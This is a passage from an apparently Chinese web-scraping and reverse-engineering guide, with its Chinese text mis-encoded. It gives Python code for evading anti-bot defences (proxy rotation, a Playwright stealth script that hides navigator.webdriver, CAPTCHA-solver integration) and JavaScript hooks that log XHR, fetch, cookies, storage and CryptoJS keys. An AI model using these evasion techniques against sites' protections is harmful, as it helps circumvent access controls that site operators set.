<h3>HTTP å¥åº·æ£€æŸ¥ç«¯ç‚¹</h3>
<pre><code class="language-python">from flask import Flask, jsonify
import redis

app = Flask(__name__)
r = redis.Redis()

@app.route('/health')
def health():
    &quot;&quot;&quot;å¥åº·æ£€æŸ¥&quot;&quot;&quot;
    checks = {
        'redis': check_redis(),
        'queue': check_queue(),
        'workers': check_workers()
    }

    all_healthy = all(checks.values())
    status_code = 200 if all_healthy else 503

    return jsonify({
        'status': 'healthy' if all_healthy else 'unhealthy',
        'checks': checks
    }), status_code

def check_redis():
    &quot;&quot;&quot;æ£€æŸ¥ Redis è¿æ¥&quot;&quot;&quot;
    try:
        r.ping()
        return True
    except:
        return False

def check_queue():
    &quot;&quot;&quot;æ£€æŸ¥é˜Ÿåˆ—çŠ¶æ€&quot;&quot;&quot;
    try:
        size = r.llen('urls')
        return size &lt; 50000  # é˜Ÿåˆ—æœªè¿‡è½½
    except:
        return False

def check_workers():
    &quot;&quot;&quot;æ£€æŸ¥ Worker çŠ¶æ€&quot;&quot;&quot;
    try:
        active = int(r.get('active_workers') or 0)
        return active &gt; 0
    except:
        return False

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
</code></pre>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-51">åˆ†å¸ƒå¼çˆ¬è™«æ¶æ„</a></li>
<li><a href="#section-55">Docker å®¹å™¨åŒ–éƒ¨ç½²</a></li>
<li><a href="#section-52">ä»£ç†æ± ç®¡ç†</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-57">
                                                <h2>[R56] Anti-Anti-Scraping Framework</h2>
                                                <h1>R56: åçˆ¬è™«å¯¹æŠ—æ¡†æ¶</h1>
<h2>æ¦‚è¿°</h2>
<p>åçˆ¬è™«å¯¹æŠ—æ¡†æ¶æ˜¯ä¸€ä¸ªç»¼åˆæ€§çš„ç³»ç»Ÿï¼Œé›†æˆäº†å¤šç§å¯¹æŠ—æŠ€æœ¯ï¼Œç”¨äºçªç ´å„ç±»åçˆ¬è™«é˜²æŠ¤ã€‚æœ¬ç« ä»‹ç»å¦‚ä½•è®¾è®¡ä¸€ä¸ªé€šç”¨çš„åçˆ¬è™«å¯¹æŠ—æ¡†æ¶ã€‚</p>
<hr />
<h2>æ¡†æ¶æ¶æ„</h2>
<pre><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚           Scraper Application              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚      Anti-Anti-Scraping Framework          â”‚
â”‚                                            â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚      Request Middleware              â”‚ â”‚
â”‚  â”‚  - User-Agent Rotation               â”‚ â”‚
â”‚  â”‚  - Header Randomization              â”‚ â”‚
â”‚  â”‚  - Cookie Management                 â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚                                            â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚      Proxy Manager                   â”‚ â”‚
â”‚  â”‚  - Proxy Pool                        â”‚ â”‚
â”‚  â”‚  - IP Rotation                       â”‚ â”‚
â”‚  â”‚  - Proxy Health Check                â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚                                            â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚      Browser Simulator               â”‚ â”‚
â”‚  â”‚  - Puppeteer/Playwright              â”‚ â”‚
â”‚  â”‚  - Fingerprint Evasion               â”‚ â”‚
â”‚  â”‚  - Human Behavior Simulation         â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚                                            â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚      CAPTCHA Solver                  â”‚ â”‚
â”‚  â”‚  - 2Captcha Integration              â”‚ â”‚
â”‚  â”‚  - OCR Recognition                   â”‚ â”‚
â”‚  â”‚  - AI Model Prediction               â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚                                            â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚      Rate Limiter                    â”‚ â”‚
â”‚  â”‚  - Adaptive Delay                    â”‚ â”‚
â”‚  â”‚  - Token Bucket                      â”‚ â”‚
â”‚  â”‚  - Request Scheduling                â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚                                            â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚      Retry &amp; Fallback                â”‚ â”‚
â”‚  â”‚  - Exponential Backoff               â”‚ â”‚
â”‚  â”‚  - Fallback Strategies               â”‚ â”‚
â”‚  â”‚  - Error Recovery                    â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<hr />
<h2>æ ¸å¿ƒç»„ä»¶å®ç°</h2>
<h3>1. Request Middleware</h3>
<pre><code class="language-python">import random
from typing import Dict, List

class RequestMiddleware:
    def __init__(self):
        self.user_agents = self._load_user_agents()
        self.headers_pool = self._load_headers()

    def _load_user_agents(self) -&gt; List[str]:
        &quot;&quot;&quot;åŠ è½½ User-Agent æ± &quot;&quot;&quot;
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        ]

    def _load_headers(self) -&gt; List[Dict]:
        &quot;&quot;&quot;åŠ è½½è¯·æ±‚å¤´æ± &quot;&quot;&quot;
        return [
            {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
                'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            },
            # æ›´å¤šå˜ä½“...
        ]

    def get_random_headers(self, referer=None) -&gt; Dict:
        &quot;&quot;&quot;è·å–éšæœºè¯·æ±‚å¤´&quot;&quot;&quot;
        headers = random.choice(self.headers_pool).copy()
        headers['User-Agent'] = random.choice(self.user_agents)

        if referer:
            headers['Referer'] = referer

        return headers

    def randomize_headers(self, headers: Dict) -&gt; Dict:
        &quot;&quot;&quot;éšæœºåŒ–è¯·æ±‚å¤´é¡ºåº&quot;&quot;&quot;
        items = list(headers.items())
        random.shuffle(items)
        return dict(items)
</code></pre>
<h3>2. Proxy Manager</h3>
<pre><code class="language-python">import redis
import requests
from typing import Optional

class ProxyManager:
    def __init__(self, redis_url='redis://localhost:6379'):
        self.r = redis.from_url(redis_url, decode_responses=True)
        self.test_url = 'http://httpbin.org/ip'

    def get_proxy(self) -&gt; Optional[str]:
        &quot;&quot;&quot;è·å–å¯ç”¨ä»£ç†&quot;&quot;&quot;
        # ä» Redis æœ‰åºé›†åˆè·å–è¯„åˆ†æœ€é«˜çš„ä»£ç†
        proxies = self.r.zrange('proxy_pool', 0, 0)
        if proxies:
            return proxies[0]
        return None

    def validate_proxy(self, proxy: str) -&gt; bool:
        &quot;&quot;&quot;éªŒè¯ä»£ç†&quot;&quot;&quot;
        proxies = {
            'http': f'http://{proxy}',
            'https': f'http://{proxy}'
        }
        try:
            response = requests.get(
                self.test_url,
                proxies=proxies,
                timeout=5
            )
            return response.status_code == 200
        except:
            return False

    def mark_success(self, proxy: str):
        &quot;&quot;&quot;æ ‡è®°ä»£ç†æˆåŠŸ&quot;&quot;&quot;
        self.r.zincrby('proxy_pool', -0.1, proxy)  # é™ä½åˆ†æ•° = æé«˜ä¼˜å…ˆçº§

    def mark_failure(self, proxy: str):
        &quot;&quot;&quot;æ ‡è®°ä»£ç†å¤±è´¥&quot;&quot;&quot;
        self.r.zincrby('proxy_pool', 1, proxy)  # æé«˜åˆ†æ•° = é™ä½ä¼˜å…ˆçº§

        # å¦‚æœå¤±è´¥æ¬¡æ•°è¿‡å¤šï¼Œç§»é™¤ä»£ç†
        score = self.r.zscore('proxy_pool', proxy)
        if score &gt; 10:
            self.r.zrem('proxy_pool', proxy)
</code></pre>
<h3>3. Browser Simulator</h3>
<pre><code class="language-python">from playwright.sync_api import sync_playwright
import random
import time

class BrowserSimulator:
    def __init__(self):
        self.playwright = sync_playwright().start()
        self.browser = None

    def launch_browser(self, headless=True, proxy=None):
        &quot;&quot;&quot;å¯åŠ¨æµè§ˆå™¨&quot;&quot;&quot;
        launch_options = {
            'headless': headless,
            'args': [
                '--disable-blink-features=AutomationControlled',
                '--disable-dev-shm-usage',
                '--no-sandbox',
            ]
        }

        if proxy:
            launch_options['proxy'] = {'server': proxy}

        self.browser = self.playwright.chromium.launch(**launch_options)
        return self.browser

    def create_stealth_context(self):
        &quot;&quot;&quot;åˆ›å»ºéšèº«ä¸Šä¸‹æ–‡&quot;&quot;&quot;
        context = self.browser.new_context(
            viewport={'width': 1920, 'height': 1080},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            locale='zh-CN',
            timezone_id='Asia/Shanghai',
        )

        # æ³¨å…¥åæ£€æµ‹è„šæœ¬
        context.add_init_script(&quot;&quot;&quot;
            // è¦†ç›– navigator.webdriver
            Object.defineProperty(navigator, 'webdriver', {
                get: () =&gt; undefined
            });

            // è¦†ç›– navigator.plugins
            Object.defineProperty(navigator, 'plugins', {
                get: () =&gt; [1, 2, 3, 4, 5]
            });

            // è¦†ç›– navigator.languages
            Object.defineProperty(navigator, 'languages', {
                get: () =&gt; ['zh-CN', 'zh', 'en']
            });

            // Chrome æ£€æµ‹ç»•è¿‡
            window.chrome = {
                runtime: {}
            };
        &quot;&quot;&quot;)

        return context

    def simulate_human_behavior(self, page):
        &quot;&quot;&quot;æ¨¡æ‹Ÿäººç±»è¡Œä¸º&quot;&quot;&quot;
        # éšæœºæ»šåŠ¨
        page.evaluate(&quot;&quot;&quot;
            () =&gt; {
                window.scrollTo({
                    top: Math.random() * document.body.scrollHeight,
                    behavior: 'smooth'
                });
            }
        &quot;&quot;&quot;)
        time.sleep(random.uniform(0.5, 2))

        # éšæœºé¼ æ ‡ç§»åŠ¨
        page.mouse.move(
            random.randint(100, 500),
            random.randint(100, 500)
        )
        time.sleep(random.uniform(0.2, 0.5))

    def scrape_with_stealth(self, url):
        &quot;&quot;&quot;éšèº«çˆ¬å–&quot;&quot;&quot;
        context = self.create_stealth_context()
        page = context.new_page()

        try:
            page.goto(url, wait_until='networkidle')
            self.simulate_human_behavior(page)
            content = page.content()
            return content
        finally:
            page.close()
            context.close()
</code></pre>
<h3>4. Rate Limiter</h3>
<pre><code class="language-python">import time
import random

class AdaptiveRateLimiter:
    def __init__(self, base_delay=1.0, max_delay=10.0):
        self.base_delay = base_delay
        self.max_delay = max_delay
        self.current_delay = base_delay
        self.success_count = 0
        self.failure_count = 0

    def wait(self):
        &quot;&quot;&quot;ç­‰å¾…é€‚å½“çš„æ—¶é—´&quot;&quot;&quot;
        delay = self.current_delay + random.uniform(-0.5, 0.5)
        time.sleep(max(0, delay))

    def record_success(self):
        &quot;&quot;&quot;è®°å½•æˆåŠŸè¯·æ±‚&quot;&quot;&quot;
        self.success_count += 1

        # è¿ç»­æˆåŠŸï¼Œé€æ¸å‡å°‘å»¶è¿Ÿ
        if self.success_count &gt; 10:
            self.current_delay = max(
                self.base_delay,
                self.current_delay * 0.9
            )
            self.success_count = 0

    def record_failure(self):
        &quot;&quot;&quot;è®°å½•å¤±è´¥è¯·æ±‚&quot;&quot;&quot;
        self.failure_count += 1

        # å¤±è´¥åˆ™å¢åŠ å»¶è¿Ÿ
        self.current_delay = min(
            self.max_delay,
            self.current_delay * 1.5
        )

        if self.failure_count &gt; 5:
            # ä¸¥é‡é™æµï¼Œé•¿æ—¶é—´ç­‰å¾…
            time.sleep(self.max_delay * 2)
            self.failure_count = 0
</code></pre>
<hr />
<h2>å®Œæ•´æ¡†æ¶é›†æˆ</h2>
<pre><code class="language-python">class AntiAntiScrapingFramework:
    def __init__(self, config):
        self.middleware = RequestMiddleware()
        self.proxy_manager = ProxyManager()
        self.browser_simulator = BrowserSimulator()
        self.rate_limiter = AdaptiveRateLimiter()

    def fetch(self, url, use_browser=False):
        &quot;&quot;&quot;æ™ºèƒ½çˆ¬å–&quot;&quot;&quot;
        # é€Ÿç‡é™åˆ¶
        self.rate_limiter.wait()

        try:
            if use_browser:
                # ä½¿ç”¨æµè§ˆå™¨æ¨¡æ‹Ÿ
                result = self._fetch_with_browser(url)
            else:
                # ä½¿ç”¨è¯·æ±‚åº“
                result = self._fetch_with_requests(url)

            self.rate_limiter.record_success()
            return result

        except Exception as e:
            self.rate_limiter.record_failure()
            raise

    def _fetch_with_requests(self, url):
        &quot;&quot;&quot;ä½¿ç”¨ requests çˆ¬å–&quot;&quot;&quot;
        proxy = self.proxy_manager.get_proxy()
        headers = self.middleware.get_random_headers()

        proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'} if proxy else None

        response = requests.get(url, headers=headers, proxies=proxies, timeout=10)

        if proxy:
            self.proxy_manager.mark_success(proxy)

        return response.text

    def _fetch_with_browser(self, url):
        &quot;&quot;&quot;ä½¿ç”¨æµè§ˆå™¨çˆ¬å–&quot;&quot;&quot;
        return self.browser_simulator.scrape_with_stealth(url)

# ä½¿ç”¨
config = {}
framework = AntiAntiScrapingFramework(config)
result = framework.fetch('https://example.com', use_browser=True)
</code></pre>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-37">åçˆ¬è™«æŠ€æœ¯æ·±åº¦åˆ†æ</a></li>
<li><a href="#section-34">æµè§ˆå™¨æŒ‡çº¹è¯†åˆ«ä¸å¯¹æŠ—</a></li>
<li><a href="#section-52">ä»£ç†æ± ç®¡ç†</a></li>
</ul>

                                            </div>
                                            </div>
                    <div class="chapter">
                        <h1 class="no-page-break">Part VII: Code Kitchen</h1>
                    
                                            <div class="section" id="section-58">
                                                <h2>[R57] JavaScript Hook Scripts</h2>
                                                <h1>R57: JavaScript Hook è„šæœ¬</h1>
<h2>æ¦‚è¿°</h2>
<p>Hookï¼ˆé’©å­ï¼‰æ˜¯é€†å‘å·¥ç¨‹ä¸­æœ€æ ¸å¿ƒçš„åŠ¨æ€åˆ†ææŠ€æœ¯ä¹‹ä¸€ã€‚é€šè¿‡è¿è¡Œæ—¶åŠ«æŒ(Runtime Interception)åŸç”Ÿ API æˆ–è‡ªå®šä¹‰å‡½æ•°ï¼Œå¯ä»¥å®ç°å¯¹ç›®æ ‡ä»£ç çš„æ— ä¾µå…¥å¼ç›‘æ§ã€å‚æ•°ç¯¡æ”¹å’Œè¡Œä¸ºä¿®æ”¹ã€‚Hook æŠ€æœ¯åŸºäº JavaScript çš„åŠ¨æ€ç‰¹æ€§å’ŒåŸå‹é“¾æœºåˆ¶ï¼Œèƒ½å¤Ÿåœ¨ä¸ä¿®æ”¹æºä»£ç çš„æƒ…å†µä¸‹æ”¹å˜ç¨‹åºæ‰§è¡Œæµç¨‹ã€‚</p>
<h3>Hook æŠ€æœ¯åŸç†</h3>
<p>Hook çš„æœ¬è´¨æ˜¯<strong>å‡½æ•°æ›¿æ¢</strong>ï¼ˆFunction Replacementï¼‰å’Œ<strong>ä»£ç†æ¨¡å¼</strong>ï¼ˆProxy Patternï¼‰ã€‚é€šè¿‡ä»¥ä¸‹å‡ ç§æ–¹å¼å®ç°ï¼š</p>
<ol>
<li><strong>ç›´æ¥æ›¿æ¢</strong>ï¼šä¿å­˜åŸå‡½æ•°å¼•ç”¨ï¼Œç”¨æ–°å‡½æ•°æ›¿æ¢ç›®æ ‡å‡½æ•°</li>
<li><strong>åŸå‹é“¾åŠ«æŒ</strong>ï¼šä¿®æ”¹ <code>prototype</code> ä¸Šçš„æ–¹æ³•ï¼Œå½±å“æ‰€æœ‰å®ä¾‹</li>
<li><strong>å±æ€§æè¿°ç¬¦åŠ«æŒ</strong>ï¼šä½¿ç”¨ <code>Object.defineProperty</code> æ‹¦æˆªå±æ€§è®¿é—®</li>
<li><strong>Proxy ä»£ç†</strong>ï¼šä½¿ç”¨ ES6 Proxy å®ç°æ›´ç²¾ç»†çš„æ‹¦æˆªæ§åˆ¶</li>
</ol>
<h3>åº”ç”¨åœºæ™¯</h3>
<ul>
<li><strong>API ç›‘æ§</strong>: è¿½è¸ª XHR/Fetch è¯·æ±‚ã€Cookie æ“ä½œã€Storage è®¿é—®</li>
<li><strong>åŠ å¯†åˆ†æ</strong>: æ•è·åŠ å¯†å‡½æ•°çš„è¾“å…¥è¾“å‡ºï¼Œå®šä½å¯†é’¥å’Œç®—æ³•</li>
<li><strong>åè°ƒè¯•ç»•è¿‡</strong>: å±è”½ <code>debugger</code> è¯­å¥å’Œæ§åˆ¶å°æ£€æµ‹</li>
<li><strong>è¡Œä¸ºä¿®æ”¹</strong>: ä¿®æ”¹å‡½æ•°è¿”å›å€¼ï¼Œç»•è¿‡éªŒè¯é€»è¾‘</li>
<li><strong>æ€§èƒ½åˆ†æ</strong>: ç»Ÿè®¡å‡½æ•°è°ƒç”¨æ¬¡æ•°å’Œæ‰§è¡Œæ—¶é—´</li>
</ul>
<hr />
<h2>åŸºç¡€ Hook æ¨¡æ¿</h2>
<h3>1. Hook å…¨å±€å‡½æ•°</h3>
<pre><code class="language-javascript">// ä¿å­˜åŸå§‹å‡½æ•°
const originalFunction = window.targetFunction;

// æ›¿æ¢ä¸ºè‡ªå®šä¹‰å‡½æ•°
window.targetFunction = function (...args) {
  console.log(&quot;[Hook] targetFunction called&quot;);
  console.log(&quot;[Hook] Arguments:&quot;, args);

  // è°ƒç”¨åŸå§‹å‡½æ•°
  const result = originalFunction.apply(this, args);

  console.log(&quot;[Hook] Return value:&quot;, result);
  return result;
};
</code></pre>
<hr />
<h2>ç½‘ç»œè¯·æ±‚ Hook</h2>
<h3>Hook XMLHttpRequest</h3>
<pre><code class="language-javascript">(function () {
  const originalOpen = XMLHttpRequest.prototype.open;
  const originalSend = XMLHttpRequest.prototype.send;

  // Hook open
  XMLHttpRequest.prototype.open = function (method, url) {
    this._method = method;
    this._url = url;
    console.log(`[XHR] ${method} ${url}`);
    return originalOpen.apply(this, arguments);
  };

  // Hook send
  XMLHttpRequest.prototype.send = function (body) {
    console.log(`[XHR] Request body:`, body);

    // Hook å“åº”
    this.addEventListener(&quot;readystatechange&quot;, function () {
      if (this.readyState === 4) {
        console.log(`[XHR] Response:`, this.responseText);
      }
    });

    return originalSend.apply(this, arguments);
  };
})();
</code></pre>
<h3>Hook Fetch</h3>
<pre><code class="language-javascript">(function () {
  const originalFetch = window.fetch;

  window.fetch = function (...args) {
    console.log(&quot;[Fetch] Request:&quot;, args);

    return originalFetch.apply(this, args).then((response) =&gt; {
      console.log(&quot;[Fetch] Response:&quot;, response);

      // Clone response to avoid consuming it
      return response
        .clone()
        .text()
        .then((body) =&gt; {
          console.log(&quot;[Fetch] Response body:&quot;, body);
          return response;
        });
    });
  };
})();
</code></pre>
<h3>é€šç”¨ç½‘ç»œè¯·æ±‚ç›‘æ§</h3>
<pre><code class="language-javascript">(function () {
  // Hook XHR
  const XHR_open = XMLHttpRequest.prototype.open;
  const XHR_send = XMLHttpRequest.prototype.send;

  XMLHttpRequest.prototype.open = function (method, url) {
    this._requestInfo = { method, url, time: Date.now() };
    console.log(`ğŸŒ [XHR] ${method} ${url}`);
    return XHR_open.apply(this, arguments);
  };

  XMLHttpRequest.prototype.send = function (body) {
    if (body) {
      console.log(`ğŸ“¤ [XHR] Body:`, body);
    }

    this.addEventListener(&quot;load&quot;, function () {
      const duration = Date.now() - this._requestInfo.time;
      console.log(
        `ğŸ“¥ [XHR] ${this.status} ${this._requestInfo.url} (${duration}ms)`
      );
      console.log(`ğŸ“¥ [XHR] Response:`, this.responseText.substring(0, 200));
    });

    return XHR_send.apply(this, arguments);
  };

  // Hook Fetch
  const originalFetch = window.fetch;
  window.fetch = async function (...args) {
    const startTime = Date.now();
    console.log(`ğŸŒ [Fetch]`, args[0]);

    if (args[1]?.body) {
      console.log(`ğŸ“¤ [Fetch] Body:`, args[1].body);
    }

    const response = await originalFetch.apply(this, args);
    const duration = Date.now() - startTime;

    console.log(`ğŸ“¥ [Fetch] ${response.status} (${duration}ms)`);

    // Clone to avoid consuming
    const clonedResponse = response.clone();
    const text = await clonedResponse.text();
    console.log(`ğŸ“¥ [Fetch] Response:`, text.substring(0, 200));

    return response;
  };
})();
</code></pre>
<hr />
<h2>Cookie Hook</h2>
<h3>ç›‘æ§ Cookie è¯»å†™</h3>
<pre><code class="language-javascript">(function () {
  let cookieCache = document.cookie;

  Object.defineProperty(document, &quot;cookie&quot;, {
    get: function () {
      console.log(&quot;ğŸª [Cookie] Read:&quot;, cookieCache);
      console.trace();
      return cookieCache;
    },
    set: function (value) {
      console.log(&quot;ğŸª [Cookie] Write:&quot;, value);
      console.trace();

      // å®é™…å†™å…¥ Cookie
      const cookieParts = value.split(&quot;;&quot;)[0];
      const [key, val] = cookieParts.split(&quot;=&quot;);

      // æ›´æ–°ç¼“å­˜
      const cookies = cookieCache.split(&quot;; &quot;);
      const index = cookies.findIndex((c) =&gt; c.startsWith(key + &quot;=&quot;));
      if (index !== -1) {
        cookies[index] = cookieParts;
      } else {
        cookies.push(cookieParts);
      }
      cookieCache = cookies.join(&quot;; &quot;);

      return value;
    },
  });
})();
</code></pre>
<hr />
<h2>Storage Hook</h2>
<h3>Hook LocalStorage</h3>
<pre><code class="language-javascript">(function () {
  const originalSetItem = localStorage.setItem;
  const originalGetItem = localStorage.getItem;
  const originalRemoveItem = localStorage.removeItem;

  localStorage.setItem = function (key, value) {
    console.log(`ğŸ’¾ [LocalStorage] Set: ${key} = ${value}`);
    console.trace();
    return originalSetItem.apply(this, arguments);
  };

  localStorage.getItem = function (key) {
    const value = originalGetItem.apply(this, arguments);
    console.log(`ğŸ’¾ [LocalStorage] Get: ${key} = ${value}`);
    return value;
  };

  localStorage.removeItem = function (key) {
    console.log(`ğŸ’¾ [LocalStorage] Remove: ${key}`);
    return originalRemoveItem.apply(this, arguments);
  };
})();
</code></pre>
<h3>Hook SessionStorage</h3>
<pre><code class="language-javascript">// åŒ LocalStorageï¼Œå°† localStorage æ›¿æ¢ä¸º sessionStorage
(function () {
  const originalSetItem = sessionStorage.setItem;
  const originalGetItem = sessionStorage.getItem;

  sessionStorage.setItem = function (key, value) {
    console.log(`ğŸ“¦ [SessionStorage] Set: ${key} = ${value}`);
    return originalSetItem.apply(this, arguments);
  };

  sessionStorage.getItem = function (key) {
    const value = originalGetItem.apply(this, arguments);
    console.log(`ğŸ“¦ [SessionStorage] Get: ${key} = ${value}`);
    return value;
  };
})();
</code></pre>
<hr />
<h2>åŠ å¯†å‡½æ•° Hook</h2>
<h3>Hook CryptoJS</h3>
<pre><code class="language-javascript">(function () {
  if (window.CryptoJS) {
    // Hook MD5
    const originalMD5 = CryptoJS.MD5;
    CryptoJS.MD5 = function (...args) {
      console.log(&quot;ğŸ” [CryptoJS.MD5] Input:&quot;, args[0].toString());
      const result = originalMD5.apply(this, args);
      console.log(&quot;ğŸ” [CryptoJS.MD5] Output:&quot;, result.toString());
      debugger; // è‡ªåŠ¨æ–­ç‚¹
      return result;
    };

    // Hook AES.encrypt
    const originalAESEncrypt = CryptoJS.AES.encrypt;
    CryptoJS.AES.encrypt = function (message, key, cfg) {
      console.log(&quot;ğŸ” [CryptoJS.AES.encrypt]&quot;);
      console.log(&quot;  Message:&quot;, message.toString());
      console.log(&quot;  Key:&quot;, key.toString());
      console.log(&quot;  Config:&quot;, cfg);
      const result = originalAESEncrypt.apply(this, arguments);
      console.log(&quot;  Result:&quot;, result.toString());
      debugger;
      return result;
    };

    // Hook AES.decrypt
    const originalAESDecrypt = CryptoJS.AES.decrypt;
    CryptoJS.AES.decrypt = function (ciphertext, key, cfg) {
      console.log(&quot;ğŸ”“ [CryptoJS.AES.decrypt]&quot;);
      console.log(&quot;  Ciphertext:&quot;, ciphertext.toString());
      console.log(&quot;  Key:&quot;, key.toString());
      const result = originalAESDecrypt.apply(this, arguments);
      console.log(&quot;  Decrypted:&quot;, result.toString(CryptoJS.enc.Utf8));
      debugger;
      return result;
    };
  }
})();
</code></pre>
<h3>Hook Web Crypto API</h3>
<pre><code class="language-javascript">(function () {
  const originalSubtle = window.crypto.subtle;

  const hookCryptoMethod = (methodName) =&gt; {
    const original = originalSubtle[methodName];
    originalSubtle[methodName] = async function (...args) {
      console.log(`ğŸ” [crypto.subtle.${methodName}]`, args);
      const result = await original.apply(this, args);
      console.log(`ğŸ” [crypto.subtle.${methodName}] Result:`, result);
      return result;
    };
  };

  hookCryptoMethod(&quot;encrypt&quot;);
  hookCryptoMethod(&quot;decrypt&quot;);
  hookCryptoMethod(&quot;sign&quot;);
  hookCryptoMethod(&quot;verify&quot;);
  hookCryptoMethod(&quot;digest&quot;);
})();
</code></pre>
<hr />
<h2>JSON Hook</h2>
<h3>Hook JSON.stringify</h3>
<pre><code class="language-javascript">(function () {
  const originalStringify = JSON.stringify;

  JSON.stringify = function (obj, replacer, space) {
    console.log(&quot;ğŸ“ [JSON.stringify] Input:&quot;, obj);
    console.trace();

    const result = originalStringify.apply(this, arguments);
    console.log(&quot;ğŸ“ [JSON.stringify] Output:&quot;, result);

    return result;
  };
})();
</code></pre>
<h3>Hook JSON.parse</h3>
<pre><code class="language-javascript">(function () {
  const originalParse = JSON.parse;

  JSON.parse = function (text, reviver) {
    console.log(&quot;ğŸ“– [JSON.parse] Input:&quot;, text);

    const result = originalParse.apply(this, arguments);
    console.log(&quot;ğŸ“– [JSON.parse] Output:&quot;, result);

    return result;
  };
})();
</code></pre>
<hr />
<h2>å®šæ—¶å™¨ Hook</h2>
<h3>Hook setTimeout</h3>
<pre><code class="language-javascript">(function () {
  const originalSetTimeout = window.setTimeout;

  window.setTimeout = function (callback, delay, ...args) {
    console.log(`â° [setTimeout] Delay: ${delay}ms`);
    console.log(
      `â° [setTimeout] Callback:`,
      callback.toString().substring(0, 100)
    );
    console.trace();

    return originalSetTimeout.apply(this, arguments);
  };
})();
</code></pre>
<h3>Hook setInterval</h3>
<pre><code class="language-javascript">(function () {
  const originalSetInterval = window.setInterval;

  window.setInterval = function (callback, delay, ...args) {
